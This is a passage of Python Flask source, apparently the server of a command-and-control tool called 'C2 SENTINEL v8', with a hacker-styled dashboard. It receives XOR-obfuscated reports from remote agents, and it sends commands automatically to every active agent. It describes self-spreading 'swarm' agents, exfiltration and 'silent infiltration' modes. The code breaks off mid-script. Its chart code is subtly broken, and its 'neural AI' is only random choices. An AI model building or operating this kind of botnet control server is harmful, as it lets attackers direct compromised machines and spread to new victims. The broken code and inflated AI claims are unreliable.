from flask import Flask, request, jsonify, send_file, redirect, render_template_string
from flask_socketio import SocketIO, emit
import json
import os
import base64
import threading
import time
from datetime import datetime, timedelta
import random
import math

# === CONFIG ===
XOR_KEY = os.getenv("XOR_KEY", "sentinel")
REPORT_FILE = "data/reports.json"
COMMAND_EXPIRY = 300
TELEGRAM_ENABLED = False
MAX_REPORTS = 1000  # Batas laporan agar tidak membebani memori

if not os.path.exists("data"):
    os.makedirs("data")
if not os.path.exists(REPORT_FILE):
    with open(REPORT_FILE, "w") as f:
        json.dump([], f)

# === STORAGE ===
ACTIVE_COMMANDS = {}
AGENT_LAST_SEEN = {}
AGENT_STATUS = {}
AGENT_CHECKINS = []
AGENT_SWARM_MAP = {}  # {agent_id: {"parent": ..., "children": [...], "ip": ...}}
SOCKETS = []

# === UTILS ===
def xor_decrypt(data_b64, key=XOR_KEY):
    try:
        decoded = base64.b64decode(data_b64).decode()
        return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(decoded))
    except Exception as e:
        print(f"[XOR ERROR] {e}")
        return None

def is_high_severity(data):
    high_keywords = ["IDOR", "RCE", "SQLi", "XSS", "Auth Bypass", "SSRF", "LFI", "RFI", "CRITICAL", "REMOTE"]
    issue = str(data.get("issue", "")).upper()
    return any(kw.upper() in issue for kw in high_keywords)

def send_alert(text):
    if not TELEGRAM_ENABLED:
        print("[TELEGRAM] Alert (nonaktif):", text)
        return
    # Implementasi nyata bisa pakai python-telegram-bot
    pass

# === NEURAL AI ENGINE ===
def neural_ai_analyze(reports):
    """AI dengan prediksi & rekomendasi proaktif"""
    try:
        total = len(reports)
        if total == 0:
            return {
                "summary": "🧠 **NEURAL AI INSIGHT**\n========================\nBelum ada data. Deploy agent sekarang!\n\n🔮 Prediksi: Jaringanmu berpotensi terinfeksi dalam 72 jam tanpa pertahanan.\n\n🎯 Rekomendasi Proaktif:\n1. Jalankan agent di semua subnet\n2. Aktifkan mode 'swarm_activate'\n3. Pantau port 22 & 3389",
                "risk_score": 85,
                "prediction": "High risk of network compromise",
                "auto_command": "swarm_activate"
            }

        # Analisis tren
        now = datetime.now()
        last_hour = 0
        high_sev = 0
        unique_hosts = set()
        swarm_agents = 0

        for r in reports:
            if is_high_severity(r):
                high_sev += 1
            host = r.get("system", {}).get("hostname", "unknown")
            unique_hosts.add(host)
            if "swarm" in r.get("status", ""):
                swarm_agents += 1

            try:
                ts = datetime.fromisoformat(r.get("timestamp", ""))
                if (now - ts).total_seconds() < 3600:
                    last_hour += 1
            except:
                pass

        # Hitung risk score
        risk_score = min(100, high_sev * 15 + (total // 10) * 5)
        if swarm_agents > 5:
            risk_score = max(risk_score, 95)  # swarm = high risk

        # Prediksi
        if swarm_agents > 0:
            prediction = f"Agent swarm aktif → {swarm_agents} agent menyebar otomatis"
            auto_command = "idle"  # biarkan swarm bekerja
        elif last_hour < 3:
            prediction = "Aktivitas rendah → risiko serangan meningkat"
            auto_command = "scan"
        else:
            prediction = "Aktivitas normal → pertahankan vigilansi"
            auto_command = "idle"

        # Rekomendasi
        summary = f"""
🧠 **NEURAL AI INSIGHT**
========================
Total Agent: {len(unique_hosts)}
Laporan: {total} (High: {high_sev})
Agent Swarm: {swarm_agents}
Aktivitas 1 Jam: {last_hour}

🔮 Prediksi: {prediction}
⚠️ Risk Score: {risk_score}/100

🎯 Rekomendasi Proaktif:
- {random.choice([
    "Aktifkan 'swarm_activate' untuk pertahanan otomatis",
    "Fokuskan scan ke subnet dengan aktivitas rendah",
    "Update semua agent ke versi terbaru",
    "Periksa exfiltration di host yang jarang beacon",
    "Aktifkan mode silent untuk infiltrasi mendalam",
    "Luncurkan 'decoy_activate' untuk menjebak attacker"
])}
- Risk Score > 80? Segera isolasi jaringan!
        """

        return {
            "summary": summary.strip(),
            "risk_score": risk_score,
            "prediction": prediction,
            "auto_command": auto_command,
            "swarm_agents": swarm_agents
        }

    except Exception as e:
        print(f"[NEURAL AI ERROR] {e}")
        return {
            "summary": "❌ Neural AI error. Switch ke mode manual.",
            "risk_score": 0,
            "prediction": "Unknown",
            "auto_command": "idle"
        }

# === AUTO-COMMAND SYSTEM ===
def auto_command_system(ai_insight):
    """Server bisa kirim perintah otomatis ke agent jika risk score tinggi"""
    if ai_insight["risk_score"] > 75:
        cmd = ai_insight["auto_command"]
        if cmd != "idle":
            # Kirim ke SEMUA agent aktif
            for agent_id in list(AGENT_LAST_SEEN.keys()):
                if agent_id not in ACTIVE_COMMANDS:  # jangan timpa perintah manual
                    ACTIVE_COMMANDS[agent_id] = {
                        "cmd": cmd,
                        "note": "AUTO: Neural AI Command",
                        "timestamp": datetime.now().isoformat(),
                        "issued_by": "neural_ai"
                    }
            print(f"[NEURAL AI] Auto-command '{cmd}' dikirim ke {len(AGENT_LAST_SEEN)} agent!")

# === CLEANUP SYSTEM ===
def cleanup_system():
    while True:
        now = datetime.now()
        # Bersihkan agent offline
        for agent_id in list(AGENT_LAST_SEEN.keys()):
            if (now - AGENT_LAST_SEEN[agent_id]).total_seconds() > 600:  # 10 menit
                AGENT_STATUS.pop(agent_id, None)
                AGENT_LAST_SEEN.pop(agent_id, None)
                AGENT_SWARM_MAP.pop(agent_id, None)
                ACTIVE_COMMANDS.pop(agent_id, None)

        # Bersihkan command kadaluarsa
        for agent_id in list(ACTIVE_COMMANDS.keys()):
            cmd = ACTIVE_COMMANDS[agent_id]
            issued = datetime.fromisoformat(cmd["timestamp"])
            if (now - issued).total_seconds() > COMMAND_EXPIRY:
                del ACTIVE_COMMANDS[agent_id]

        # Batasi jumlah laporan
        try:
            with open(REPORT_FILE, "r+") as f:
                reports = json.load(f)
                if len(reports) > MAX_REPORTS:
                    reports = reports[-MAX_REPORTS:]
                    f.seek(0)
                    json.dump(reports, f, indent=2, ensure_ascii=False)
                    f.truncate()
        except:
            pass

        time.sleep(60)

threading.Thread(target=cleanup_system, daemon=True).start()

# === TRACK CHECKINS ===
def track_agent_checkins():
    while True:
        now = datetime.now()
        minute_key = now.strftime("%H:%M")
        online_now = sum(1 for agent_id in AGENT_LAST_SEEN.keys()
                        if (now - AGENT_LAST_SEEN[agent_id]).total_seconds() < 300)
        AGENT_CHECKINS.append({"time": minute_key, "online": online_now})
        if len(AGENT_CHECKINS) > 60:
            AGENT_CHECKINS.pop(0)
        time.sleep(60)

threading.Thread(target=track_agent_checkins, daemon=True).start()

# === FLASK + SOCKETIO APP ===
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
socketio = SocketIO(app, cors_allowed_origins="*")

# === TEMPLATES ===
def get_dashboard_template():
    return '''
<!DOCTYPE html>
<html>
<head>
    <title>🌐 C2 SENTINEL v8 - NEURAL SWARM ULTIMATE</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.jsdelivr.net/npm/chart.js "></script>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js "></script>
    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/build/three.min.js "></script>
    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/examples/js/controls/OrbitControls.js "></script>
    <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/examples/js/loaders/GLTFLoader.js "></script>
    <style>
        :root {
            --primary: #00ff99;
            --secondary: #00ccff;
            --danger: #ff3366;
            --success: #00ff00;
            --warning: #ffcc00;
            --bg-dark: #020c02;
            --bg-darker: #000400;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body { 
            background: var(--bg-darker);
            color: var(--primary); 
            font-family: 'Share Tech Mono', 'Courier New', monospace; 
            padding: 0; 
            margin: 0;
            overflow-x: hidden;
            background: radial-gradient(circle at center, #001a00, var(--bg-darker));
            background-attachment: fixed;
        }
        .container { 
            max-width: 1600px; 
            margin: auto; 
            padding: 20px;
            position: relative;
            z-index: 10;
        }
        h1, h2, h3, h4 { 
            color: var(--primary); 
            text-shadow: 0 0 10px var(--primary), 0 0 20px var(--primary);
            letter-spacing: 1px;
        }
        a { 
            color: var(--secondary); 
            text-decoration: none; 
            text-shadow: 0 0 5px var(--secondary);
            transition: all 0.3s ease;
        }
        a:hover { 
            text-decoration: underline; 
            filter: drop-shadow(0 0 8px var(--secondary));
            transform: scale(1.05);
        }
        pre { 
            background: rgba(0, 20, 0, 0.8); 
            padding: 15px; 
            border-radius: 8px; 
            overflow-x: auto;
            border: 1px solid var(--success);
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
            font-size: 0.95em;
            line-height: 1.5;
        }
        .card { 
            background: rgba(0, 30, 0, 0.75); 
            padding: 25px; 
            margin: 20px 0; 
            border-radius: 12px; 
            border: 1px solid var(--success);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
        }
        .card:hover {
            box-shadow: 0 0 30px rgba(0, 255, 153, 0.5);
            transform: translateY(-5px);
        }
        .grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); 
            gap: 25px; 
        }
        .status-online { 
            color: var(--success); 
            text-shadow: 0 0 8px var(--success);
            font-weight: bold;
        }
        .status-offline { 
            color: var(--danger); 
            text-shadow: 0 0 8px var(--danger);
            font-weight: bold;
        }
        .blink { 
            animation: blinker 1.5s linear infinite; 
            text-shadow: 0 0 15px var(--danger);
            font-weight: bold;
        }
        @keyframes blinker { 
            0%, 100% { opacity: 1; text-shadow: 0 0 15px var(--danger); }
            50% { opacity: 0.5; text-shadow: 0 0 5px var(--danger); }
        }
        button { 
            background: linear-gradient(135deg, rgba(0, 50, 0, 0.9), rgba(0, 80, 0, 0.9)); 
            color: var(--success); 
            border: 2px solid var(--success); 
            padding: 12px 24px; 
            cursor: pointer;
            border-radius: 8px;
            font-weight: bold;
            text-shadow: 0 0 5px var(--success);
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
            transition: all 0.3s ease;
            font-family: inherit;
            letter-spacing: 1px;
        }
        button:hover { 
            background: linear-gradient(135deg, rgba(0, 80, 0, 0.9), rgba(0, 120, 0, 0.9));
            box-shadow: 0 0 25px rgba(0, 255, 153, 0.6);
            transform: scale(1.05);
            letter-spacing: 2px;
        }
        select, input { 
            background: rgba(0, 40, 0, 0.9); 
            color: var(--primary); 
            border: 1px solid var(--success); 
            padding: 12px;
            border-radius: 6px;
            width: 100%;
            max-width: 450px;
            font-family: inherit;
            font-size: 1em;
        }
        .header { 
            border-bottom: 3px solid var(--success); 
            padding-bottom: 15px; 
            margin-bottom: 30px;
            text-align: center;
            background: rgba(0, 20, 0, 0.5);
            border-radius: 12px 12px 0 0;
            backdrop-filter: blur(5px);
        }
        .terminal { 
            height: 450px; 
            overflow-y: auto; 
            background: rgba(0, 15, 0, 0.95); 
            padding: 20px;
            border: 2px solid var(--success);
            border-radius: 10px;
            box-shadow: inset 0 0 20px rgba(0, 255, 0, 0.3);
            font-family: 'Courier New', monospace;
            scrollbar-width: thin;
            scrollbar-color: var(--success) rgba(0,30,0,0.5);
        }
        .terminal::-webkit-scrollbar {
            width: 8px;
        }
        .terminal::-webkit-scrollbar-track {
            background: rgba(0,30,0,0.3);
        }
        .terminal::-webkit-scrollbar-thumb {
            background-color: var(--success);
            border-radius: 10px;
        }
        .ai-insight { 
            background: linear-gradient(135deg, rgba(0, 40, 0, 0.95), rgba(0, 20, 40, 0.95)); 
            border-left: 6px solid #ff00ff; 
            padding: 25px; 
            margin: 25px 0;
            border-radius: 10px;
            box-shadow: 0 0 25px rgba(255, 0, 255, 0.4);
            position: relative;
            overflow: hidden;
        }
        .ai-insight::before {
            content: "";
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(rgba(255,0,255,0) 0%, rgba(255,0,255,0.1) 50%, rgba(255,0,255,0) 100%);
            animation: scan 3s linear infinite;
        }
        @keyframes scan {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }
        .chart-container { 
            height: 350px; 
            margin: 25px 0; 
            background: rgba(0, 25, 0, 0.6);
            border-radius: 12px;
            padding: 15px;
            border: 1px solid rgba(0, 255, 0, 0.3);
        }
        .swarm-map { 
            height: 500px; 
            background: rgba(0, 15, 0, 0.9);
            border: 2px solid var(--success);
            border-radius: 12px;
            position: relative;
            overflow: hidden;
        }
        .matrix-rain {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
            opacity: 0.15;
        }
        .neon-title {
            font-size: 3.5em;
            font-weight: 900;
            letter-spacing: 4px;
            text-transform: uppercase;
            background: linear-gradient(90deg, #00ff00, #00ffff, #ff00ff, #ffff00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-fill-color: transparent;
            animation: glow 3s ease-in-out infinite alternate;
            text-shadow: 0 0 20px rgba(0,255,0,0.5);
            margin: 10px 0;
        }
        @keyframes glow {
            0% { text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00; }
            25% { text-shadow: 0 0 20px #00ffff, 0 0 30px #00ffff; }
            50% { text-shadow: 0 0 20px #ff00ff, 0 0 40px #ff00ff; }
            75% { text-shadow: 0 0 20px #ffff00, 0 0 30px #ffff00; }
            100% { text-shadow: 0 0 30px #00ff00, 0 0 50px #00ff99; }
        }
        .cyberpunk-loader {
            width: 60px;
            height: 60px;
            border: 6px solid transparent;
            border-top: 6px solid var(--success);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
            box-shadow: 0 0 20px var(--success);
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .pulse {
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0.7); }
            70% { box-shadow: 0 0 0 15px rgba(0, 255, 0, 0); }
            100% { box-shadow: 0 0 0 0 rgba(0, 255, 0, 0); }
        }
        .tag {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.85em;
            margin: 2px;
            background: rgba(0, 50, 0, 0.8);
            border: 1px solid var(--success);
        }
        .tag-high { background: rgba(80, 0, 0, 0.8); border-color: var(--danger); color: var(--danger); }
        .tag-swarm { background: rgba(40, 0, 60, 0.8); border-color: #ff00ff; color: #ff00ff; }
        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0, 20, 0, 0.95);
            border: 2px solid var(--warning);
            padding: 15px;
            border-radius: 10px;
            box-shadow: 0 0 20px var(--warning);
            z-index: 1000;
            animation: slideIn 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
            max-width: 400px;
        }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        @keyframes fadeOut {
            from { opacity: 1; }
            to { opacity: 0; }
        }
        .particle-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }
        /* Custom Scrollbar */
        ::-webkit-scrollbar {
            width: 10px;
        }
        ::-webkit-scrollbar-track {
            background: rgba(0,30,0,0.3);
        }
        ::-webkit-scrollbar-thumb {
            background: var(--success);
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: var(--primary);
        }
        @media (max-width: 768px) {
            .grid {
                grid-template-columns: 1fr;
            }
            .neon-title {
                font-size: 2em;
            }
            .header nav a {
                display: block;
                margin: 5px 0;
            }
        }
    </style>
</head>
<body>
    <div class="particle-container" id="particles-js"></div>
    <div class="matrix-rain" id="matrixRain"></div>
    
    <div class="container">
        <div class="header">
            <h1 class="neon-title">🌐 C2 SENTINEL v8</h1>
            <h3><span class="blink">[NEURAL SWARM ULTIMATE EDITION]</span></h3>
            <nav style="margin-top: 15px;">
                <a href="/">🏠 Dashboard</a> |
                <a href="/agents">👾 Agent Live</a> |
                <a href="/command">🎯 Command Center</a> |
                <a href="/reports">📁 Reports</a> |
                <a href="/logs">📜 Live Logs</a> |
                <a href="/analytics">🤖 AI Analytics</a> |
                <a href="/swarm">🕸️ Swarm Map</a>
            </nav>
        </div>

        <!-- CONTENT -->
        {{ content | safe }}

        <footer style="margin-top: 60px; font-size: 0.9em; color: #666; text-align: center; padding: 20px; border-top: 1px solid rgba(0,255,0,0.2);">
            <div style="margin-bottom: 10px;">
                C2 Sentinel v8 - NEURAL SWARM ULTIMATE EDITION &copy; 2025 | 
                <span class="status-{{ 'online' if agents_online > 0 else 'offline' }}">Agents: {{ agents_online }} Online</span> |
                <span style="color: #ff00ff; text-shadow: 0 0 5px #ff00ff;">Neural AI: {{ 'ACTIVE' if neural_active else 'STANDBY' }}</span> |
                <span style="color: #ffff00;">Risk Score: {{ risk_score }}/100</span>
            </div>
            <div>
                <small>System Status: <span class="pulse" style="color: #00ff00;">● ONLINE</span> | Real-time via WebSocket</small>
            </div>
        </footer>
    </div>

    <script>
        // Matrix Rain Effect
        const matrix = document.getElementById('matrixRain');
        const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789!@#$%^&*()_+';
        const fontSize = 12;
        let columns = Math.floor(window.innerWidth / fontSize);
        const drops = [];

        for (let i = 0; i < columns; i++) {
            drops[i] = 1;
        }

        function drawMatrix() {
            matrix.innerHTML = '';
            for (let i = 0; i < drops.length; i++) {
                const text = chars.charAt(Math.floor(Math.random() * chars.length));
                const x = i * fontSize;
                const y = drops[i] * fontSize;
                const opacity = Math.random() * 0.8 + 0.2;
                matrix.innerHTML += `<div style="position: absolute; color: rgba(0, 255, 0, ${opacity}); font-size: ${fontSize}px; top: ${y}px; left: ${x}px; text-shadow: 0 0 5px #00ff00;">${text}</div>`;
                if (Math.random() > 0.97 && drops[i] > 10) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 50);

        // Handle resize
        window.addEventListener('resize', () => {
            columns = Math.floor(window.innerWidth / fontSize);
            drops.length = 0;
            for (let i = 0; i < columns; i++) {
                drops[i] = 1;
            }
        });

        // Particle JS (simplified version)
        function createParticles() {
            const container = document.getElementById('particles-js');
            for (let i = 0; i < 50; i++) {
                const particle = document.createElement('div');
                particle.style.position = 'absolute';
                particle.style.width = '3px';
                particle.style.height = '3px';
                particle.style.backgroundColor = '#00ff00';
                particle.style.borderRadius = '50%';
                particle.style.boxShadow = '0 0 10px #00ff00';
                particle.style.opacity = Math.random() * 0.6 + 0.2;
                particle.style.top = Math.random() * 100 + '%';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animation = `float ${Math.random() * 10 + 5}s linear infinite`;
                container.appendChild(particle);
            }
        }
        createParticles();

        // Float animation for particles
        const style = document.createElement('style');
        style.innerHTML = `
            @keyframes float {
                0% { transform: translate(0, 0) rotate(0deg); }
                25% { transform: translate(${Math.random()*100-50}px, ${Math.random()*100-50}px) rotate(90deg); }
                50% { transform: translate(${Math.random()*100-50}px, ${Math.random()*100-50}px) rotate(180deg); }
                75% { transform: translate(${Math.random()*100-50}px, ${Math.random()*100-50}px) rotate(270deg); }
                100% { transform: translate(0, 0) rotate(360deg); }
            }
        `;
        document.head.appendChild(style);

        // WebSocket Connection
        const socket = io();
        socket.on('connect', () => {
            console.log('🔌 Connected to C2 Sentinel WebSocket');
        });

        socket.on('update_dashboard', (data) => {
            // Update agent count in footer
            const footer = document.querySelector('footer');
            if (footer) {
                const agentSpan = footer.querySelector('.status-online, .status-offline');
                if (agentSpan) {
                    agentSpan.textContent = `Agents: ${data.agents_online} Online`;
                    agentSpan.className = data.agents_online > 0 ? 'status-online' : 'status-offline';
                }
            }
        });

        socket.on('new_alert', (data) => {
            showNotification(data.message);
        });

        socket.on('command_issued', (data) => {
            if (window.location.pathname === '/command') {
                location.reload();
            }
        });

        function showNotification(message) {
            const notif = document.createElement('div');
            notif.className = 'notification';
            notif.innerHTML = `<strong>🚨 ALERT</strong><br>${message}`;
            document.body.appendChild(notif);
            setTimeout(() => {
                notif.remove();
            }, 5000);
        }

        // Auto-refresh for non-WebSocket pages
        setInterval(() => {
            if(!['/logs', '/agents', '/', '/swarm'].includes(window.location.pathname)) return;
            // For these pages, rely on WebSocket instead of reload
        }, 5000);
    </script>
</body>
</html>
'''

# === ROUTES ===
@app.route('/')
def home():
    now = datetime.now()
    online_count = 0
    for agent_id, last_seen in AGENT_LAST_SEEN.items():
        if (now - last_seen).total_seconds() < 300:
            AGENT_STATUS[agent_id] = "online"
            online_count += 1
        else:
            AGENT_STATUS[agent_id] = "offline"

    # Load & analyze with NEURAL AI
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        if not isinstance(reports, list):
            reports = []
    except:
        reports = []

    ai_insight = neural_ai_analyze(reports)

    # Trigger auto-command if needed
    if ai_insight["risk_score"] > 75:
        auto_command_system(ai_insight)

    # Prepare chart data
    chart_labels = [item["time"] for item in AGENT_CHECKINS]
    chart_data = [item["online"] for item in AGENT_CHECKINS]

    content = f'''
    <div class="ai-insight">
        <h3>🧠 NEURAL AI INSIGHT — PREDIKSI & OTOMASI CANGGIH</h3>
        <pre style="color:#ff00ff; white-space: pre-wrap; font-weight: bold; font-size: 1.1em;">{ai_insight["summary"]}</pre>
        <p style="color: #ffff00; font-weight: bold; font-size: 1.2em; margin-top: 15px;">⚠️ AUTO-COMMAND: <span style="color: #00ff00; text-shadow: 0 0 10px #00ff00;">{ai_insight["auto_command"].upper()}</span> (Risk Score: {ai_insight["risk_score"]}/100)</p>
    </div>

    <div class="grid">
        <div class="card pulse">
            <h2>📊 Statistik Real-time</h2>
            <p>🟢 <b>Agent Online:</b> <span class="status-online">{online_count}</span></p>
            <p>💾 <b>Total Laporan:</b> {len(reports)}</p>
            <p>🚨 <b>High Severity:</b> {sum(1 for r in reports if is_high_severity(r))}</p>
            <p>🕸️ <b>Agent Swarm:</b> <span class="tag tag-swarm">{ai_insight.get("swarm_agents", 0)}</span></p>
            <p>⏱️ <b>Command Aktif:</b> {len(ACTIVE_COMMANDS)}</p>
        </div>
        <div class="card">
            <h2>🚀 Quick Actions</h2>
            <p><a href="/command"><button>🎯 Kirim Perintah</button></a></p>
            <p><a href="/agents"><button>👾 Lihat Agent Live</button></a></p>
            <p><a href="/swarm"><button>🕸️ Swarm Visualization</button></a></p>
            <p><a href="/analytics"><button>📈 AI Analytics</button></a></p>
        </div>
    </div>

    <div class="card">
        <h2>📈 Grafik Agent Online (60 Menit Terakhir)</h2>
        <div class="chart-container">
            <canvas id="agentChart"></canvas>
        </div>
    </div>

    <div class="card">
        <h2>📡 Agent Terakhir Check-in</h2>
        <pre style="font-size: 0.95em;">
{chr(10).join([f"[{last_seen.strftime('%H:%M:%S')}] {agent_id} - <span class='status-{AGENT_STATUS.get(agent_id, 'offline')}'>{AGENT_STATUS.get(agent_id, 'unknown').upper()}</span>" for agent_id, last_seen in list(AGENT_LAST_SEEN.items())[-5:]]) or "Belum ada agent check-in."}
        </pre>
    </div>

    <script>
        const ctx = document.getElementById('agentChart').getContext('2d');
        new Chart(ctx, {{
            type: 'line',
             {{
                labels: {json.dumps(chart_labels)},
                datasets: [{{
                    label: 'Agent Online',
                     {json.dumps(chart_data)},
                    borderColor: '#00ff00',
                    backgroundColor: 'rgba(0, 255, 0, 0.1)',
                    tension: 0.4,
                    pointBackgroundColor: '#ff00ff',
                    pointBorderColor: '#ffffff',
                    pointRadius: 5,
                    fill: true
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{
                        labels: {{
                            color: '#00ff00',
                            font: {{
                                size: 14
                            }}
                        }}
                    }},
                    tooltip: {{
                        backgroundColor: 'rgba(0, 30, 0, 0.9)',
                        titleColor: '#00ff00',
                        bodyColor: '#ffffff'
                    }}
                }},
                scales: {{
                    x: {{
                        ticks: {{ 
                            color: '#00ff00',
                            font: {{
                                size: 12
                            }}
                        }},
                        grid: {{
                            color: 'rgba(0, 255, 0, 0.1)'
                        }}
                    }},
                    y: {{
                        beginAtZero: true,
                        ticks: {{ 
                            color: '#00ff00',
                            font: {{
                                size: 12
                            }}
                        }},
                        grid: {{
                            color: 'rgba(0, 255, 0, 0.1)'
                        }}
                    }}
                }},
                animation: {{
                    duration: 2000,
                    easing: 'easeInOutQuart'
                }}
            }}
        }});
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=online_count, neural_active=True, risk_score=ai_insight.get("risk_score", 0))

@app.route('/swarm')
def swarm_map():
    """Visualisasi 3D penyebaran agent"""
    # Bangun struktur genealogy
    nodes = []
    links = []
    agent_list = list(AGENT_LAST_SEEN.keys())

    for i, agent_id in enumerate(agent_list[:50]):  # batasi 50 agent
        status = "online" if (datetime.now() - AGENT_LAST_SEEN[agent_id]).total_seconds() < 300 else "offline"
        nodes.append({
            "id": agent_id,
            "name": agent_id[:8] + "...",
            "status": status,
            "group": 1,
            "x": random.uniform(-150, 150),
            "y": random.uniform(-150, 150),
            "z": random.uniform(-150, 150)
        })

        # Buat link ke "parent" acak (simulasi)
        if i > 0:
            parent_idx = random.randint(0, i-1)
            links.append({
                "source": parent_idx,
                "target": i,
                "value": 1
            })

    content = f'''
    <h2>🕸️ NEURAL SWARM 3D MAP — REAL-TIME NETWORK PROPAGATION</h2>
    <div class="card">
        <div class="swarm-map" id="swarmMap"></div>
        <p><small>Visualisasi 3D agent dan koneksi penyebarannya. <span class="blink">AUTO-REFRESH DISABLED — REAL-TIME VIA WEBSOCKET</span></small></p>
    </div>

    <script>
        // Simple 3D visualization with Three.js
        const container = document.getElementById('swarmMap');
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, container.clientWidth / container.clientHeight, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer({{ antialias: true }});
        renderer.setSize(container.clientWidth, container.clientHeight);
        renderer.setClearColor(0x000500);
        renderer.shadowMap.enabled = true;
        container.appendChild(renderer.domElement);

        // Add ambient and directional lights
        const ambientLight = new THREE.AmbientLight(0x333333);
        scene.add(ambientLight);
        
        const directionalLight = new THREE.DirectionalLight(0x00ff00, 1);
        directionalLight.position.set(5, 10, 7);
        directionalLight.castShadow = true;
        scene.add(directionalLight);

        // Add point light for glow effect
        const pointLight = new THREE.PointLight(0x00ffff, 1.5, 100);
        pointLight.position.set(0, 0, 0);
        scene.add(pointLight);

        // Add agents as spheres
        const nodes = {json.dumps(nodes)};
        const links = {json.dumps(links)};
        const spheres = [];
        const lines = [];

        // Create particle system for background
        const particleCount = 1000;
        const particles = new THREE.BufferGeometry();
        const particlePositions = new Float32Array(particleCount * 3);
        
        for (let i = 0; i < particleCount; i++) {{
            particlePositions[i * 3] = (Math.random() - 0.5) * 1000;
            particlePositions[i * 3 + 1] = (Math.random() - 0.5) * 1000;
            particlePositions[i * 3 + 2] = (Math.random() - 0.5) * 1000;
        }}
        
        particles.setAttribute('position', new THREE.BufferAttribute(particlePositions, 3));
        const particleMaterial = new THREE.PointsMaterial({{ 
            color: 0x00ff00,
            size: 1,
            transparent: true,
            opacity: 0.6
        }});
        const particleSystem = new THREE.Points(particles, particleMaterial);
        scene.add(particleSystem);

        // Create spheres for agents
        nodes.forEach((node, i) => {{
            const geometry = new THREE.SphereGeometry(5, 32, 32);
            const color = node.status === 'online' ? 0x00ff00 : 0xff0000;
            const material = new THREE.MeshPhongMaterial({{ 
                color: color,
                emissive: color,
                emissiveIntensity: 0.5,
                shininess: 100,
                transparent: true,
                opacity: 0.9
            }});
            const sphere = new THREE.Mesh(geometry, material);
            sphere.position.set(node.x, node.y, node.z);
            sphere.castShadow = true;
            sphere.receiveShadow = true;
            scene.add(sphere);
            spheres.push(sphere);

            // Add label
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            canvas.width = 256;
            canvas.height = 64;
            context.fillStyle = 'rgba(0, 0, 0, 0.7)';
            context.fillRect(0, 0, 256, 64);
            context.font = '32px Share Tech Mono';
            context.fillStyle = node.status === 'online' ? '#00ff00' : '#ff0000';
            context.fillText(node.name, 10, 40);
            context.strokeStyle = '#ffffff';
            context.strokeRect(0, 0, 256, 64);

            const texture = new THREE.CanvasTexture(canvas);
            const labelMaterial = new THREE.SpriteMaterial({{ map: texture }});
            const label = new THREE.Sprite(labelMaterial);
            label.position.set(node.x, node.y + 10, node.z);
            label.scale.set(20, 5, 1);
            scene.add(label);
        }});

        // Create links between agents
        links.forEach(link => {{
            const start = spheres[link.source].position;
            const end = spheres[link.target].position;
            
            // Create tube geometry for fancy connection
            const curve = new THREE.LineCurve3(start.clone(), end.clone());
            const tubeGeometry = new THREE.TubeGeometry(curve, 20, 0.5, 8, false);
            const tubeMaterial = new THREE.MeshPhongMaterial({{
                color: 0x00ffff,
                emissive: 0x0088ff,
                emissiveIntensity: 0.5,
                transparent: true,
                opacity: 0.8
            }});
            const tube = new THREE.Mesh(tubeGeometry, tubeMaterial);
            scene.add(tube);
            lines.push(tube);
        }});

        camera.position.set(0, 0, 300);
        camera.lookAt(0, 0, 0);

        // Add orbit controls
        const controls = new THREE.OrbitControls(camera, renderer.domElement);
        controls.enableDamping = true;
        controls.dampingFactor = 0.1;
        controls.rotateSpeed = 0.5;

        // Add automatic slow rotation
        let autoRotate = true;
        const toggleAutoRotate = () => {{
            autoRotate = !autoRotate;
            controls.autoRotate = autoRotate;
            controls.autoRotateSpeed = 0.5;
        }};
        
        // Double click to toggle auto-rotate
        renderer.domElement.addEventListener('dblclick', toggleAutoRotate);

        function animate() {{
            requestAnimationFrame(animate);
            
            // Animate particles
            particleSystem.rotation.y += 0.0005;
            
            // Animate spheres with pulse
            spheres.forEach((sphere, i) => {{
                const scale = 1 + Math.sin(Date.now() * 0.003 + i) * 0.1;
                sphere.scale.set(scale, scale, scale);
            }});
            
